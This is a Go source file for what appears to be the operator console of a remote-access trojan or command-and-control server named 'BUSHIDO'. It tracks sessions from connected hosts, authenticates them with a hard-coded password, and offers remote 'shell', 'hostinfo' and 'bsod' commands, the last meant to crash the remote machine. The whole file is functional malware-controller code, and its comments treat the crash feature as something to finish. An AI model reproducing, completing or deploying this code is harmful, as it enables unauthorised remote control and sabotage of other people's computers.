package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"
)

func NewSessionList() *SessionList {
	return &SessionList{
		Stop: make(chan struct{}),
	}
}

// registerListener registers a new listener
func (ll *SessionList) registerSession(port string, conn net.Conn) {
	id := rand.Intn(9000)
	// Create a new Session struct
	newSession := &Session{
		id:     id,
		Port:   port,
		Status: "Active",
		Conn:   conn,
	}
	// Add to the head of the linked list
	newSession.Next = ll.Head
	ll.Head = newSession
}

func authSession(conn *net.Conn) bool {
	auth := make([]byte, 32)
	(*conn).SetReadDeadline(time.Now().Add(15 * time.Second))
	n, err := (*conn).Read(auth)
	if err != nil {
		fmt.Println("Error reading from connection:", err)
		return false
	}
	if n <= 1 {
		fmt.Println("Error amount of data returned is less than 1")
		return false
	}
	authString := string(auth[:n])

	// Perform authentication
	if authString != "i_L0V_y0U_Ju5t1n_P3t3R\n" {
		fmt.Println("Authentication failed")
		(*conn).Close()
		return false
	}
	(*conn).SetReadDeadline(time.Time{})
	return true
}

// displaySessions displays the active sessions
func (ll *SessionList) displaySessions() {
	fmt.Println("\nActive Sessions:")
	current := ll.Head
	for current != nil {
		fmt.Println("SessionID:", current.id, "- Port:", current.Port, "- Status:", current.Status)
		current = current.Next
	}
	fmt.Println()
}

// func (ll *SessionList) updateSessionStatus(targetPort string, status string, conn net.Conn) {
// 	current := ll.Head
// 	for current.Port != targetPort {
// 		current = current.Next
// 	}
// 	current.Status = status
// 	current.Conn = conn
// }

func (ll *SessionList) closeSessions() {
	fmt.Println()
	current := ll.Head
	for current != nil {
		fmt.Println("Unit on", current.id, "lost")
		current.Conn.Close()
		current.Conn = nil // Clear the connections list

		current = current.Next
	}
	fmt.Println()
	ll.Head = nil // Reset the listener list
}

func openSession(id int, sl *SessionList) {
	current := sl.Head
	if current == nil {
		fmt.Println("\nSession not found\n")
		return
	}
	for current.id != id && current != nil {
		current = current.Next
		if current == nil {
			fmt.Println("\nSession not found\n")
			return
		}
	}
	fmt.Println("\nSession Found !")
	fmt.Println("Connecting ...")
	if !authSession(&current.Conn) {
		return
	}
	fmt.Println("BUSHIDO Shell Open ...\n")
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("BU$H1D0-1 >> ")
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input:", err)
			continue
		}
		command = strings.TrimSpace(command)
		switch command { //All of the func below will be found under bushido.go
		case "shell":
			shell(&current.Conn)
		case "hostinfo":
			hostinfo(&current.Conn)
		case "bsod": //FIX THIS. IT THROWS THE SERVER OUT OF SYNC WITH THE CLIENT. Fix it ClientSide a7la
			if bsod(&current.Conn) {
				fmt.Println("HOST BSOD !")
				fmt.Println("Impliment Feature where the host is removed from the list when this happens")
				return
			} else {
				fmt.Println("Couldn't BSOD the Host ...")
			}
		case "bg":
			return
		case "exit":
			return
		default:
			fmt.Println("\nUsage: shell, hostinfo, bsod, bg\n")
		}
	}
}
